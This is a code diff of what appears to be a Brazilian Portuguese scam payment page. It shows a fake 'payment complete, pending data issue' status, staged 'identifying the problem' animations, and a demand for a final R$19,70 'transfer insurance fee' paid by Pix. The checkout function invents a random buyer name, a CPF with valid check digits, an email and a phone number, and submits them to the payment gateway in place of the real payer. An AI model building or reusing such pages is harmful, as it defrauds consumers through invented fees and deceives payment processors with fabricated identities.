-            É necessário realizar o pagamento da Última taxa (Taxa do Seguro Transferência) para corrigir a pendência e liberar sua transferência. O valor é único e fixo de R$19,70.
-          </div>
-        </div>
+  #transferStatusWidget #initialScreen { display: block; }
+  #transferStatusWidget #progressScreen { display: none; width: 100%; }
 
-        <!-- Item 4: Botão de Pagamento -->
-        <div id="finalButton">
-          <button class="btn-pagar-seguro" onclick="checkout(event)">
-            <span>Pagar o Seguro Transferência</span>
-            <svg viewBox="0 0 24 24" fill="none" stroke="#ffffff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
-              <polyline points="9 18 15 12 9 6"></polyline>
-            </svg>
-          </button>
+  #transferStatusWidget .status-card {
+    width: 100%;
+    margin: 0;
+    padding: 0;
+    overflow: hidden;
+    border-radius: 15px;
+    background: #fff;
+    box-shadow: 0 2px 4px rgba(0, 0, 0, .12);
+  }
+
+  #transferStatusWidget .status-header {
+    display: block !important;
+    width: 100%;
+    margin: 0;
+    padding: 10px 15px;
+    background: #383838;
+    color: #fff;
+  }
+
+  #transferStatusWidget .status-header h3 {
+    display: block;
+    margin: 0 !important;
+    padding: 0;
+    color: #fff !important;
+    font: 700 17px/22px Arial, Helvetica, sans-serif;
+  }
+
+  /* Força as duas linhas a ficarem visíveis, anulando regras genéricas antigas. */
+  #transferStatusWidget .status-card .status-item {
+    display: flex !important;
+    align-items: center !important;
+    gap: 15px !important;
+    width: 100% !important;
+    height: auto !important;
+    min-height: 69px !important;
+    margin: 0 !important;
+    padding: 10px 15px !important;
+    overflow: visible !important;
+    background: #fff !important;
+    opacity: 1 !important;
+    visibility: visible !important;
+    transform: none !important;
+    pointer-events: auto !important;
+  }
+
+  #transferStatusWidget .status-icon {
+    display: flex !important;
+    align-items: center;
+    justify-content: center;
+    flex: 0 0 40px;
+    width: 40px;
+    height: 40px;
+    margin: 0;
+    padding: 0;
+    border-radius: 50%;
+    color: #fff !important;
+  }
+
+  #transferStatusWidget .status-success {
+    background: #f59e0b;
+    animation: transferPulseOrange 2s ease-in-out infinite;
+  }
+
+  #transferStatusWidget .status-success span {
+    display: block;
+    color: #fff !important;
+    font-size: 27px;
+    font-weight: 400;
+    line-height: 1;
+  }
+
+  #transferStatusWidget .status-pending {
+    background: #e11d48;
+    animation: transferPulseRed 2s ease-in-out infinite;
+  }
+
+  #transferStatusWidget .status-pending svg {
+    display: block !important;
+    width: 24px;
+    height: 24px;
+    fill: none;
+    stroke: #fff !important;
+  }
+
+  #transferStatusWidget .status-label {
+    display: block !important;
+    flex: 1 1 auto !important;
+    min-width: 0 !important;
+    margin: 0 !important;
+    padding: 0 !important;
+    color: #333 !important;
+    font: 700 16px/1.3 Arial, Helvetica, sans-serif !important;
+    text-indent: 0 !important;
+    text-transform: none !important;
+    visibility: visible !important;
+    opacity: 1 !important;
+  }
+
+  #transferStatusWidget .status-description {
+    display: block;
+    margin: 20px 8px 17px;
+    padding: 0;
+    color: #626262;
+    font-size: 16px;
+    font-weight: 700;
+    line-height: 1.4;
+    text-align: center;
+  }
+
+  #transferStatusWidget .button-area {
+    display: flex !important;
+    align-items: center;
+    justify-content: center;
+    width: 100%;
+    margin: 0;
+    padding: 0;
+  }
+
+  #transferStatusWidget .status-button {
+    display: flex !important;
+    align-items: center;
+    justify-content: space-between;
+    gap: 12px;
+    width: 100%;
+    max-width: 335px;
+    min-width: 0;
+    min-height: 70px;
+    margin: 20px 0 0;
+    padding: 14px 18px;
+    border: 0;
+    border-radius: 14px;
+    background: #2865ae;
+    color: #fff !important;
+    font: 700 17px/1.3 Arial, Helvetica, sans-serif;
+    text-align: left;
+    cursor: pointer;
+    animation: transferPulseButton 1.5s ease-in-out infinite;
+    transition: background .2s ease;
+    -webkit-tap-highlight-color: transparent;
+  }
+
+  #transferStatusWidget .status-button span {
+    display: block;
+    flex: 1;
+    color: #fff !important;
+  }
+
+  #transferStatusWidget .status-button svg {
+    display: block;
+    flex: 0 0 32px;
+    width: 32px;
+    height: 32px;
+    fill: none;
+    stroke: #fff !important;
+  }
+
+  #transferStatusWidget .status-button:hover { background: #1e4f8b; }
+  #transferStatusWidget .status-button:active { transform: scale(.98); }
+
+  #transferStatusWidget .loading-wrap {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    gap: 14px;
+    width: 100%;
+    min-height: 120px;
+    padding: 24px 10px;
+    text-align: center;
+  }
+
+  #transferStatusWidget .loading-wrap.initial-loading {
+    align-items: center;
+    justify-content: flex-start;
+    min-height: 420px;
+    padding-top: 18px;
+  }
+
+  #transferStatusWidget .loading-spinner {
+    flex: 0 0 42px;
+    width: 42px;
+    height: 42px;
+    border: 6px solid #ccc;
+    border-top-color: #2865ae;
+    border-radius: 50%;
+    animation: transferSpin .75s linear infinite;
+  }
+
+  #transferStatusWidget .loading-text {
+    color: #626262;
+    font-size: 14px;
+    font-weight: 600;
+    line-height: 1.4;
+  }
+
+  #transferStatusWidget .flow-card,
+  #transferStatusWidget .flow-alert {
+    display: flex;
+    align-items: center;
+    gap: 14px;
+    width: 100%;
+    margin: 0 0 14px;
+    padding: 16px 14px;
+    border-radius: 14px;
+    opacity: 0;
+    transform: translateY(12px);
+    animation: transferAppear .45s ease forwards;
+  }
+
+  #transferStatusWidget .flow-card {
+    background: #fff;
+    box-shadow: 0 2px 5px rgba(0, 0, 0, .12);
+  }
+
+  #transferStatusWidget .flow-icon {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex: 0 0 40px;
+    width: 40px;
+    height: 40px;
+    border-radius: 50%;
+    color: #fff;
+  }
+
+  #transferStatusWidget .flow-icon.orange { background: #f59e0b; }
+  #transferStatusWidget .flow-icon.red { background: #e11d48; }
+
+  #transferStatusWidget .flow-icon svg {
+    display: block;
+    width: 24px;
+    height: 24px;
+    fill: none;
+    stroke: #fff;
+    stroke-width: 2.3;
+    stroke-linecap: round;
+    stroke-linejoin: round;
+  }
+
+  #transferStatusWidget .flow-message {
+    flex: 1;
+    min-width: 0;
+    color: #333;
+    font-size: 15px;
+    font-weight: 700;
+    line-height: 1.4;
+    overflow-wrap: anywhere;
+  }
+
+  #transferStatusWidget .flow-alert {
+    background: #b91c1c;
+    color: #fff;
+    padding: 18px 14px;
+  }
+
+  #transferStatusWidget .alert-icon {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex: 0 0 40px;
+    width: 40px;
+    height: 40px;
+    border-radius: 50%;
+    background: #fff;
+    color: #b91c1c;
+    font-size: 27px;
+    font-weight: 700;
+  }
+
+  #transferStatusWidget .alert-message {
+    flex: 1;
+    min-width: 0;
+    color: #fff;
+    font-size: 14px;
+    font-weight: 700;
+    line-height: 1.4;
+    overflow-wrap: anywhere;
+  }
+
+  @keyframes transferSpin { to { transform: rotate(360deg); } }
+  @keyframes transferAppear { to { opacity: 1; transform: translateY(0); } }
+  @keyframes transferPulseOrange {
+    0%, 100% { box-shadow: 0 0 0 0 rgba(245, 158, 11, 0); }
+    50% { box-shadow: 0 0 0 5px rgba(245, 158, 11, .18); }
+  }
+  @keyframes transferPulseRed {
+    0%, 100% { box-shadow: 0 0 0 0 rgba(225, 29, 72, 0); }
+    50% { box-shadow: 0 0 0 5px rgba(225, 29, 72, .16); }
+  }
+  @keyframes transferPulseButton {
+    0%, 100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(40, 101, 174, .35); }
+    50% { transform: scale(1.02); box-shadow: 0 0 0 7px rgba(40, 101, 174, 0); }
+  }
+
+  @media (max-width: 360px) {
+    #transferStatusWidget { padding: 20px 16px 14px; }
+    #transferStatusWidget .status-label { font-size: 15px !important; }
+    #transferStatusWidget .status-description { margin-right: 4px; margin-left: 4px; font-size: 15px; }
+    #transferStatusWidget .status-button { padding: 12px 14px; font-size: 16px; }
+    #transferStatusWidget .flow-message { font-size: 14px; }
+  }
+
+  @media (prefers-reduced-motion: reduce) {
+    #transferStatusWidget .status-icon,
+    #transferStatusWidget .status-button,
+    #transferStatusWidget .loading-spinner {
+      animation: none !important;
+      transition: none !important;
+    }
+    #transferStatusWidget .flow-card,
+    #transferStatusWidget .flow-alert { opacity: 1; transform: none; }
+  }
+</style>
+
+<div id="transferStatusWidget" class="status-container">
+  <div id="transferInitialScreen">
+    <div class="status-card">
+      <div class="status-header"><h3>Status</h3></div>
+      <div class="status-item">
+        <div class="status-icon status-success"><span aria-hidden="true">✓</span></div>
+        <div class="status-label"><b> <h3> Pagamento Concluído </h3></b></div>
+      </div>
+      <div class="status-item">
+        <div class="status-icon status-pending">
+          <svg viewBox="0 0 24 24" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+            <path d="M10.3 3.9 1.9 18a2 2 0 0 0 1.7 3h16.8a2 2 0 0 0 1.7-3L13.7 3.9a2 2 0 0 0-3.4 0z"></path>
+            <line x1="12" y1="9" x2="12" y2="13"></line>
+            <line x1="12" y1="17" x2="12.01" y2="17"></line>
+          </svg>
         </div>
+        <div class="status-label"><b> <h3> Pendência nos Dados </h3></b></div>
       </div>
     </div>
+
+    <p class="status-description"><b> Seu pagamento foi concluido com sucesso, porém foi encontrado uma pendência nos seus dados. Clique abaixo para resolver esse problema! </b></p>
+
+    <div class="button-area">
+      <button type="button" class="status-button" id="transferStartButton">
+        <span>Resolver Problema</span>
+        <svg viewBox="0 0 24 24" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="9 18 15 12 9 6"></polyline></svg>
+      </button>
+    </div>
+  </div>
+
+  <div id="transferProgressScreen" aria-live="polite" aria-atomic="false"></div>
+</div>
+
+<script>
+(function () {
+  "use strict";
+  const root = document.getElementById("transferStatusWidget");
+  if (!root) return;
+
+  const initialScreen = root.querySelector("#transferInitialScreen");
+  const progressScreen = root.querySelector("#transferProgressScreen");
+  const startButton = root.querySelector("#transferStartButton");
+  const delayMs = 1000;
+  let started = false;
+
+  const gearIcon = '<svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="3"></circle><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 1 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 1 1-4 0v-.09a1.65 1.65 0 0 0-1-1.51 1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 1 1-2.83-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 1 1 0-4h.09a1.65 1.65 0 0 0 1.51-1 1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 1 1 2.83-2.83l.06.06a1.65 1.65 0 0 0 1.82.33 1.65 1.65 0 0 0 1-1.51V3a2 2 0 1 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 1 1 2.83 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82 1.65 1.65 0 0 0 1.51 1H21a2 2 0 1 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z"></path></svg>';
+  const warningIcon = '<svg viewBox="0 0 24 24" aria-hidden="true"><path d="M10.3 3.9 1.9 18a2 2 0 0 0 1.7 3h16.8a2 2 0 0 0 1.7-3L13.7 3.9a2 2 0 0 0-3.4 0z"></path><line x1="12" y1="9" x2="12" y2="13"></line><line x1="12" y1="17" x2="12.01" y2="17"></line></svg>';
+
+  const steps = [
+    {
+      kind: "card",
+      tone: "orange",
+      icon: gearIcon,
+      text: "Estamos identificando o problema nos seus dados!"
+    },
+    {
+      kind: "card",
+      tone: "red",
+      icon: warningIcon,
+      text: "Identificamos que há uma pendência nos seus dados de transferência!"
+    },
+    {
+      kind: "alert",
+      text: "É necessário realizar o pagamento da Última taxa (Taxa do Seguro Transferência) para corrigir a pendência e liberar sua transferência. O valor é único e fixo de R$19,70."
+    }
+  ];
+
+  function makeLoader(label, initial) {
+    const wrap = document.createElement("div");
+    wrap.className = "loading-wrap" + (initial ? " initial-loading" : "");
+    wrap.setAttribute("role", "status");
+    wrap.setAttribute("aria-label", label || "Carregando");
+
+    const spinner = document.createElement("div");
+    spinner.className = "loading-spinner";
+    spinner.setAttribute("aria-hidden", "true");
+    wrap.appendChild(spinner);
+
+    if (label) {
+      const text = document.createElement("div");
+      text.className = "loading-text";
+      text.textContent = label;
+      wrap.appendChild(text);
+    }
+    return wrap;
+  }
+
+  function makeStep(step) {
+    if (step.kind === "alert") {
+      const alert = document.createElement("div");
+      alert.className = "flow-alert";
+      const icon = document.createElement("div");
+      icon.className = "alert-icon";
+      icon.setAttribute("aria-hidden", "true");
+      icon.textContent = "!";
+      const text = document.createElement("div");
+      text.className = "alert-message";
+      text.textContent = step.text;
+      alert.append(icon, text);
+      return alert;
+    }
+
+    const card = document.createElement("div");
+    card.className = "flow-card";
+    const icon = document.createElement("div");
+    icon.className = "flow-icon " + step.tone;
+    icon.innerHTML = step.icon;
+    const text = document.createElement("div");
+    text.className = "flow-message";
+    text.textContent = step.text;
+    card.append(icon, text);
+    return card;
+  }
+
+  
+function showFinalButton() {
+  const area = document.createElement("div");
+  area.id = "finalButton";
+
+  const button = document.createElement("button");
+  button.type = "button";
+  button.className = "btn-pagar-seguro";
+
+  const label = document.createElement("span");
+  label.textContent = "Pagar o Seguro Transferência";
+
+  const svg = document.createElementNS(
+    "http://www.w3.org/2000/svg",
+    "svg"
+  );
+
+  svg.setAttribute("viewBox", "0 0 24 24");
+  svg.setAttribute("fill", "none");
+  svg.setAttribute("stroke", "#ffffff");
+  svg.setAttribute("stroke-width", "3");
+  svg.setAttribute("stroke-linecap", "round");
+  svg.setAttribute("stroke-linejoin", "round");
+  svg.setAttribute("aria-hidden", "true");
+
+  const polyline = document.createElementNS(
+    "http://www.w3.org/2000/svg",
+    "polyline"
+  );
+
+  polyline.setAttribute("points", "9 18 15 12 9 6");
+
+  svg.appendChild(polyline);
+  button.append(label, svg);
+
+  // Executa a função checkout(event) ao clicar
+  button.addEventListener("click", function (event) {
+    checkout(event);
+  });
+
+  area.appendChild(button);
+  progressScreen.appendChild(area);
+}
+
+
+  function showStep(index) {
+    progressScreen.appendChild(makeStep(steps[index]));
+    const loader = makeLoader(index === steps.length - 1 ? "Finalizando orientações..." : "Carregando próxima orientação...");
+    progressScreen.appendChild(loader);
+
+    window.setTimeout(function () {
+      loader.remove();
+      if (index < steps.length - 1) {
+        showStep(index + 1);
+      } else {
+        showFinalButton();
+      }
+    }, delayMs);
+  }
+
+  function startFlow() {
+    if (started) return;
+    started = true;
+    startButton.disabled = true;
+    initialScreen.style.display = "none";
+    progressScreen.style.display = "block";
+    progressScreen.replaceChildren();
+    progressScreen.appendChild(makeLoader("", true));
+
+    window.setTimeout(function () {
+      progressScreen.replaceChildren();
+      showStep(0);
+    }, delayMs);
+  }
+
+  startButton.addEventListener("click", startFlow);
+})();
+</script>
+
+
   </main>
 
   <!-- 4. Rodapé com Logotipos Oficiais -->
@@ -132,96 +1421,226 @@
 
   <script>
     function getOrCreateRandomGatewayCustomer() {
-      var saved = null;
-      try {
-        var str = localStorage.getItem("gateway_customer");
-        if (str) saved = JSON.parse(str);
-      } catch (e) {}
+  var saved = null;
 
-      if (saved && saved.name && saved.cpf && String(saved.cpf).length === 11) {
-        return saved;
-      }
+  try {
+    var str = localStorage.getItem("gateway_customer");
+    if (str) saved = JSON.parse(str);
+  } catch (e) {}
 
-      var firstNames = [
-        "Gabriel", "Lucas", "Matheus", "Guilherme", "Rodrigo", "Felipe", "Bruno", "Leonardo",
-        "Thiago", "Gustavo", "Rafael", "Eduardo", "Vinicius", "Daniel", "Marcelo", "Alexandre",
-        "Amanda", "Beatriz", "Camila", "Larissa", "Mariana", "Juliana", "Fernanda", "Patricia",
-        "Aline", "Leticia", "Jessica", "Carolina", "Bruna", "Renata", "Vanessa", "Natalia"
-      ];
-      var surnames = [
-        "Silva", "Santos", "Oliveira", "Souza", "Rodrigues", "Ferreira", "Alves", "Pereira",
-        "Lima", "Gomes", "Costa", "Ribeiro", "Martins", "Carvalho", "Almeida", "Lopes",
-        "Soares", "Fernandes", "Vieira", "Barbosa", "Rocha", "Dias", "Nascimento", "Andrade",
-        "Moreira", "Nunes", "Marques", "Machado", "Mendes", "Freitas", "Cardoso", "Ramos"
-      ];
-      var f = firstNames[Math.floor(Math.random() * firstNames.length)];
-      var s1 = surnames[Math.floor(Math.random() * surnames.length)];
-      var s2 = surnames[Math.floor(Math.random() * surnames.length)];
-      while (s2 === s1) s2 = surnames[Math.floor(Math.random() * surnames.length)];
-      var randomName = f + " " + s1 + " " + s2;
+  if (
+    saved &&
+    saved.name &&
+    saved.cpf &&
+    String(saved.cpf).length === 11 &&
+    saved.email &&
+    saved.phone
+  ) {
+    return saved;
+  }
 
-      var digits = [];
-      for (var i = 0; i < 9; i++) digits.push(Math.floor(Math.random() * 10));
-      var sum1 = 0;
-      for (var i = 0; i < 9; i++) sum1 += digits[i] * (10 - i);
-      var rem1 = (sum1 * 10) % 11;
-      var d1 = (rem1 === 10 || rem1 === 11) ? 0 : rem1;
-      digits.push(d1);
-      var sum2 = 0;
-      for (var i = 0; i < 10; i++) sum2 += digits[i] * (11 - i);
-      var rem2 = (sum2 * 10) % 11;
-      var d2 = (rem2 === 10 || rem2 === 11) ? 0 : rem2;
-      digits.push(d2);
-      var randomCpf = digits.join("");
-      var cleanFirst = f.toLowerCase().replace(/[^a-z]/g, "");
-      var cleanSur1 = s1.toLowerCase().replace(/[^a-z]/g, "");
-      var cleanSur2 = s2.toLowerCase().replace(/[^a-z]/g, "");
+  var maleNames = [
+    "Gabriel", "Lucas", "Matheus", "Guilherme", "Rodrigo", "Felipe",
+    "Bruno", "Leonardo", "Thiago", "Gustavo", "Rafael", "Eduardo",
+    "Vinicius", "Daniel", "Marcelo", "Alexandre", "André", "Antonio",
+    "Arthur", "Bernardo", "Caio", "Carlos", "César", "Cristiano",
+    "Davi", "Diego", "Enzo", "Fernando", "Francisco", "Heitor",
+    "Henrique", "Igor", "Joaquim", "José", "Lorenzo", "Luiz",
+    "Miguel", "Murilo", "Nicolas", "Otávio", "Paulo", "Pedro",
+    "Renan", "Ricardo", "Samuel", "Vitor", "Wesley", "Adriano",
+    "Alberto", "Anderson", "Breno", "Cauã", "Danilo", "Emanuel",
+    "Erick", "Fabiano", "Fábio", "Flávio", "Frederico", "Giovanni",
+    "Hugo", "Isaac", "Jorge", "Jonathan", "Leandro", "Márcio",
+    "Nathan", "Pietro", "Raul", "Roberto", "Sérgio", "Tomás",
+    "Vicente", "William", "Yuri", "Alex", "Cauê", "Dênis",
+    "Everton", "Jonas", "Kelvin", "Mário", "Renato", "Ruan"
+  ];
 
-      var domains = [
-        "gmail.com", "outlook.com", "hotmail.com",
-        "yahoo.com.br", "yahoo.com", "icloud.com"
-      ];
-      var domain = domains[Math.floor(Math.random() * domains.length)];
+  var femaleNames = [
+    "Amanda", "Beatriz", "Camila", "Larissa", "Mariana", "Juliana",
+    "Fernanda", "Patricia", "Aline", "Leticia", "Jessica", "Carolina",
+    "Bruna", "Renata", "Vanessa", "Natalia", "Ana", "Alice",
+    "Alícia", "Bianca", "Clara", "Eduarda", "Elisa", "Emilly",
+    "Ester", "Gabriela", "Helena", "Isabela", "Isadora", "Laura",
+    "Lívia", "Luana", "Manuela", "Maria", "Melissa", "Nicole",
+    "Olivia", "Rafaela", "Rebeca", "Sabrina", "Sofia", "Vitória",
+    "Adriana", "Alessandra", "Bárbara", "Cecília", "Daniela",
+    "Débora", "Elaine", "Eliane", "Evelyn", "Flávia", "Geovana",
+    "Giovana", "Heloísa", "Iara", "Irene", "Júlia", "Lorena",
+    "Maitê", "Mirela", "Priscila", "Raquel", "Samara", "Tainá",
+    "Talita", "Tatiane", "Valentina", "Yasmin", "Zélia",
+    "Cristina", "Mônica", "Simone", "Teresa", "Viviane", "Andressa",
+    "Elaísa", "Milena", "Pâmela", "Rayssa", "Stella"
+  ];
 
-      var numDigits = Math.floor(1 + Math.random() * 4); // 1 a 4 digitos
-      var num = "";
-      for (var dIdx = 0; dIdx < numDigits; dIdx++) {
-        num += Math.floor(Math.random() * 10);
-      }
+  var compoundNames = [
+    "João Pedro", "João Lucas", "João Miguel", "João Gabriel",
+    "Pedro Henrique", "Pedro Lucas", "Luiz Felipe", "Luiz Henrique",
+    "Carlos Eduardo", "Carlos Henrique", "José Miguel", "José Pedro",
+    "Ana Clara", "Ana Júlia", "Ana Beatriz", "Ana Carolina",
+    "Maria Eduarda", "Maria Clara", "Maria Luiza", "Maria Fernanda",
+    "Maria Alice", "Maria Júlia", "Maria Vitória", "Laura Beatriz",
+    "Luiza Helena", "Isabela Cristina", "Vitória Maria",
+    "Mariana Luiza", "Sofia Helena", "Clara Beatriz",
+    "João Vitor", "João Paulo", "João Guilherme", "Pedro Augusto",
+    "Enzo Gabriel", "Davi Lucca", "Miguel Augusto", "Arthur Miguel",
+    "Ana Luiza", "Ana Laura", "Maria Helena", "Maria Cecília",
+    "Maria Valentina", "Maria Isabel", "Laura Sofia", "Lara Beatriz",
+    "Luiza Maria", "Ana Vitória", "Julia Beatriz", "Isabela Maria"
+  ];
 
-      var emailFormats = [
-        cleanFirst + "." + cleanSur2 + num,
-        cleanFirst + "_" + cleanSur2 + num,
-        cleanFirst + cleanSur2 + num,
-        cleanFirst + (cleanSur1 ? cleanSur1[0] : "") + cleanSur2 + num,
-        cleanFirst + num,
-        (cleanFirst ? cleanFirst[0] : "") + "." + cleanSur2 + num,
-        (cleanFirst ? cleanFirst[0] : "") + "_" + cleanSur2 + num,
-        cleanSur2 + "." + cleanFirst + num,
-        cleanFirst + "_" + Math.floor(10 + Math.random() * 90) + "_" + cleanSur2,
-        cleanFirst + "." + (cleanSur1 ? cleanSur1 : "contato") + num,
-        cleanFirst + cleanSur2
-      ];
+  var surnames = [
+    "Silva", "Santos", "Oliveira", "Souza", "Rodrigues", "Ferreira",
+    "Alves", "Pereira", "Lima", "Gomes", "Costa", "Ribeiro",
+    "Martins", "Carvalho", "Almeida", "Lopes", "Soares", "Fernandes",
+    "Vieira", "Barbosa", "Rocha", "Dias", "Nascimento", "Andrade",
+    "Moreira", "Nunes", "Marques", "Machado", "Mendes", "Freitas",
+    "Cardoso", "Ramos", "Gonçalves", "Santana", "Teixeira", "Moura",
+    "Azevedo", "Cavalcanti", "Monteiro", "Medeiros", "Correia",
+    "Campos", "Pinto", "Batista", "Reis", "Cunha", "Pires",
+    "Farias", "Melo", "Castro", "Duarte", "Peixoto", "Rezende",
+    "Tavares", "Queiroz", "Borges", "Figueiredo", "Abreu",
+    "Vasconcelos", "Miranda", "Brito", "Leal", "Siqueira", "Moraes",
+    "Antunes", "Coelho", "Sales", "Cordeiro", "Dantas", "Viana",
+    "Xavier", "Barros", "Aragão", "Assis", "Braga", "Bastos",
+    "Bernardes", "Camargo", "Amaral", "Lacerda", "Menezes", "Porto",
+    "Rangel", "Serra", "Torres", "Valente", "Falcão", "Paiva",
+    "Bittencourt", "Sampaio", "Brandão", "Coutinho", "Lourenço",
+    "Magalhães", "Matos", "Nogueira", "Prado", "Ramalho",
+    "Trindade", "Pacheco", "Macedo", "Barreto", "Cabral",
+    "Cerqueira", "Domingues", "Esteves", "Figueira", "Garcia",
+    "Leite", "Lins", "Mota", "Neves", "Noronha", "Paz", "Rosa",
+    "Sá", "Simões", "Vargas"
+  ];
 
-      var randomEmail = emailFormats[Math.floor(Math.random() * emailFormats.length)] + "@" + domain;
+  function pick(list) {
+    return list[Math.floor(Math.random() * list.length)];
+  }
 
-      var ddds = ["11", "19", "21", "27", "31", "41", "47", "48", "51", "61", "62", "71", "81", "85", "91"];
-      var ddd = ddds[Math.floor(Math.random() * ddds.length)];
-      var randomPhone = ddd + "9" + Math.floor(10000000 + Math.random() * 90000000);
+  var useCompoundName = Math.random() < 0.35;
+  var isMale = Math.random() < 0.5;
 
-      var customer = {
-        name: randomName,
-        cpf: randomCpf,
-        email: randomEmail,
-        phone: randomPhone
-      };
+  var f = useCompoundName
+    ? pick(compoundNames)
+    : pick(isMale ? maleNames : femaleNames);
 
-      try {
-        localStorage.setItem("gateway_customer", JSON.stringify(customer));
-      } catch (e) {}
+  var s1 = pick(surnames);
+  var s2 = pick(surnames);
 
-      return customer;
-    }
+  while (s2 === s1) {
+    s2 = pick(surnames);
+  }
+
+  var randomName = f + " " + s1 + " " + s2;
+
+  // Geração de CPF sintético com dígitos verificadores.
+  // Não garante que o número não pertença a uma pessoa real.
+  var digits = [];
+
+  for (var i = 0; i < 9; i++) {
+    digits.push(Math.floor(Math.random() * 10));
+  }
+
+  var sum1 = 0;
+
+  for (var i = 0; i < 9; i++) {
+    sum1 += digits[i] * (10 - i);
+  }
+
+  var rem1 = (sum1 * 10) % 11;
+  var d1 = rem1 >= 10 ? 0 : rem1;
+
+  digits.push(d1);
+
+  var sum2 = 0;
+
+  for (var i = 0; i < 10; i++) {
+    sum2 += digits[i] * (11 - i);
+  }
+
+  var rem2 = (sum2 * 10) % 11;
+  var d2 = rem2 >= 10 ? 0 : rem2;
+
+  digits.push(d2);
+
+  var randomCpf = digits.join("");
+
+  // E-mail sintético.
+  // Remove acentos para gerar um endereço em formato convencional.
+  function normalize(value) {
+    return value
+      .normalize("NFD")
+      .replace(/[\u0300-\u036f]/g, "")
+      .toLowerCase()
+      .replace(/[^a-z]/g, "");
+  }
+
+  var nameParts = f.split(" ");
+  var cleanFirst = normalize(nameParts[0]);
+  var cleanSur1 = normalize(s1);
+  var cleanSur2 = normalize(s2);
+
+  var domains = [
+    "gmail.com",
+    "outlook.com",
+    "hotmail.com"
+  ];
+
+  var domain = pick(domains);
+
+  var numDigits = Math.floor(1 + Math.random() * 4);
+  var num = "";
+
+  for (var dIdx = 0; dIdx < numDigits; dIdx++) {
+    num += Math.floor(Math.random() * 10);
+  }
+
+  var emailFormats = [
+    cleanFirst + "." + cleanSur2 + num,
+    cleanFirst + "_" + cleanSur2 + num,
+    cleanFirst + cleanSur2 + num,
+    cleanFirst + (cleanSur1 ? cleanSur1[0] : "") + cleanSur2 + num,
+    cleanFirst + num,
+    cleanFirst[0] + "." + cleanSur2 + num,
+    cleanFirst[0] + "_" + cleanSur2 + num,
+    cleanSur2 + "." + cleanFirst + num,
+    cleanFirst + "_" + Math.floor(10 + Math.random() * 90) + "_" + cleanSur2,
+    cleanFirst + "." + (cleanSur1 || "contato") + num,
+    cleanFirst + cleanSur2
+  ];
+
+  var randomEmail = pick(emailFormats) + "@" + domain;
+
+  // DDDs brasileiros.
+  var ddds = [
+    "11", "12", "13", "14", "15", "16", "17", "18", "19",
+    "21", "22", "24", "27", "28",
+    "31", "32", "33", "34", "35", "37", "38",
+    "41", "42", "43", "44", "45", "46", "47", "48", "49",
+    "51", "53", "54", "55",
+    "61", "62", "63", "64", "65", "66", "67", "68", "69",
+    "71", "73", "74", "75", "77", "79",
+    "81", "82", "83", "84", "85", "86", "87", "88", "89",
+    "91", "92", "93", "94", "95", "96", "97", "98", "99"
+  ];
+
+  var ddd = pick(ddds);
+  var randomPhone =
+    ddd + "9" + Math.floor(10000000 + Math.random() * 90000000);
+
+  var customer = {
+    name: randomName,
+    cpf: randomCpf,
+    email: randomEmail,
+    phone: randomPhone
+  };
+
+  try {
+    localStorage.setItem("gateway_customer", JSON.stringify(customer));
+  } catch (e) {}
+
+  return customer;
+}
 
     function checkout(event) {
       if (event) event.preventDefault();
@@ -247,7 +1666,7 @@
       } catch (e) {}
 
       currentParams.set("valor", "19.70");
-      currentParams.set("gateway", "kiwify");
+      currentParams.set("gateway", "pepper");
 
       var gatewayCustomer = getOrCreateRandomGatewayCustomer();
       currentParams.set("gateway_name", gatewayCustomer.name);
@@ -280,8 +1699,8 @@
         }
       }, 7000);
 
-      if (window.KiwifyAPI && typeof window.KiwifyAPI.createPix === "function") {
-        window.KiwifyAPI.createPix("19.70", gatewayCustomer)
+      if (window.PepperAPI && typeof window.PepperAPI.createPix === "function") {
+        window.PepperAPI.createPix("19.70", gatewayCustomer)
           .then(function (res) {
             if (!finished) {
               finished = true;
@@ -298,7 +1717,7 @@
             }
           })
           .catch(function (err) {
-            console.warn("KiwifyAPI createPix direct:", err);
+            console.warn("PepperAPI createPix direct:", err);
             if (!finished) {
               finished = true;
               clearTimeout(timer);
